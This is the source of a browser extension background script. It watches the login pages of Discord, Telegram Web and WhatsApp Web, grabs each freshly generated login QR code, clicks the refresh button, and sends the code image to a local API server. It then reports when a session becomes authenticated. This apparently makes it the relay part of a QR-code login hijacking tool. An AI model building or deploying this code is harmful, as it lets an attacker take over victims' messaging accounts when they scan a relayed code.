var sessions = new Map();
var running = false;
var lastSrc = "";

const API_URL = "http://127.0.0.1:35000";

const API_TOKEN = "00000000-0000-0000-0000-000000000001";
const QRCODE_ID = "11111111-1111-1111-1111-111111111110";

var QRRules = new Map();

QRRules.set("discord.com", {
    imgSelector: "[class^='qrCodeContainer-']",
    buttonSelector: "",
    authSelector: "",
});
QRRules.set("web.telegram.org", {
    imgSelector: "#auth-pages canvas",
    buttonSelector: "",
    authSelector: "#folders-sidebar",
});
QRRules.set("web.whatsapp.com", {
    imgSelector: "[data-testid='link-device-qr-code'] canvas",
    buttonSelector: '[data-testid="link-device-qr-code"] > span > button',
    authSelector: "[data-testid='chat-list']",
});

class Session {
    constructor(tab) {
        this.tab = tab;
        this.running = false;
        this.imgSrc = "";
        this.imgSelector = "";
        this.buttonSelector = "";
        this.authSelector = "";
    };

    worker() {
        var session = this;
        var nextRunDelay = 500;

        chrome.tabs.sendMessage(session.tab.id, { message: "get-location" })
            .then((response) => {
                if (response !== undefined) {
                    var o = QRRules.get(response.location.host);
                    if (o !== undefined) {
                        session.imgSelector = o.imgSelector;
                        session.buttonSelector = o.buttonSelector;
                        session.authSelector = o.authSelector;
                        session.running = true;
                        chrome.action.setIcon({
                            tabId: session.tab.id,
                            path: "icons/icon16.png"
                        });
                    }
                }
            })
            .catch(() => {
                sessions.delete(session.tab.id);
                return;
             });

        var foundImage = false;
        if (session.imgSelector !== "") {
            nextRunDelay = 4000;
            chrome.tabs.sendMessage(session.tab.id, { message: "get-image", selector: session.imgSelector })
                .then((response) => {
                    if (response !== undefined) {
                        if (response.imgSrc != "" && session.imgSrc != response.imgSrc) {
                            // new image
                            //console.log("tab:" + session.tab.id + " img:" + response.imgSrc + " host:" + response.host);
                            session.imgSrc = response.imgSrc;
                            foundImage = true;

                            fetch(API_URL + "/qrcode/" + QRCODE_ID, {
                                method: "PUT",
                                headers: {
                                    "Content-Type": "application/json",
                                    "Authorization": "Bearer " + API_TOKEN
                                },
                                body: JSON.stringify({ id: QRCODE_ID, source: session.imgSrc, host: response.host })
                            })
                                .then((response) => response.json())
                                .then((result) => {
                                    console.log("api: success:", result);
                                })
                                .catch((error) => {
                                    console.error("api: error:", error);
                                });
                        }
                    }
                })
                .catch(() => { });

            if (session.buttonSelector != "") {
                // click a reload button if available
                chrome.tabs.sendMessage(session.tab.id, { message: "click-button", selector: session.buttonSelector })
                nextRunDelay = 2000;
                //setTimeout(function() { session.clickDelay = false; }, 2000);
            }
        }
        if (!foundImage) {
            // check if we are not already authenticated
            if (session.authSelector !== "") {
                chrome.tabs.sendMessage(session.tab.id, { message: "item-exists", selector: session.authSelector })
                .then((response) => {
                    console.log(response);
                    if (response !== undefined) {
                        if (response.exists === true) {
                            // authorized
                            const isAuthenticated = true;

                            fetch(API_URL + "/authenticated", {
                                method: "PUT",
                                headers: {
                                    "Content-Type": "application/json",
                                    Authorization: "Bearer " + API_TOKEN, // Keep this if this route is also protected
                                },
                                body: JSON.stringify({
                                    authenticated: isAuthenticated,
                                }),
                            })
                                .then((response) => response.json())
                                .then((result) => {
                                    console.log("api: success:", result);
                                })
                                .catch((error) => {
                                    console.error("api: error:", error);
                                });
                            session.running = false;
                            console.log(
                                "tab:" +
                                    session.tab.id +
                                    " authorized - aborting",
                            );
                            return;
                        }
                    }
                })
                .catch(() => { });
            }
        }

        function tab_callback() {
            if (chrome.runtime.lastError) {
                sessions.delete(session.tab.id);
            } else {
                setTimeout(function () { session.worker() }, nextRunDelay);
            }
        }
        chrome.tabs.get(session.tab.id, tab_callback);
    }
}

chrome.runtime.onMessage.addListener(
    function (request, sender, sendResponse) {
        //console.log(request);
        //console.log(sender.tabId);
    }
);

function extractQR(tabId, selector) {
    //console.log("tabId: " + tabId + " selector:" + selector);
    var img = document.querySelector(selector);
    if (img !== null) {
        if (img.src != lastSrc) {
            //console.log(img.src);
            chrome.runtime.sendMessage({ tabId: tabId, imgSrc: img.src });

        }
    }
    return "";
}

chrome.action.onClicked.addListener((tab) => {
    if (!tab.url.includes("chrome://")) {
        var session = sessions.get(tab.id);
        if (session == undefined) {
            session = new Session(tab);
            session.imgSelector = "";
            session.buttonSelector = "";
            sessions.set(tab.id, session);
        }
        if (session.running) {
            return;
        }

        session.worker();
    }
});

chrome.tabs.onActivated.addListener((activeInfo) => {
    //console.log(activeInfo.tabId);
    var session = sessions.get(activeInfo.tabId);
    if (session !== undefined) {
        if (session.running) {
            chrome.action.setIcon({
                tabId: activeInfo.tabId,
                path: "icons/icon16.png"
            });
            return;
        }
    }
    chrome.action.setIcon({
        tabId: activeInfo.tabId,
        path: "icons/icon16-off.png"
    });
});
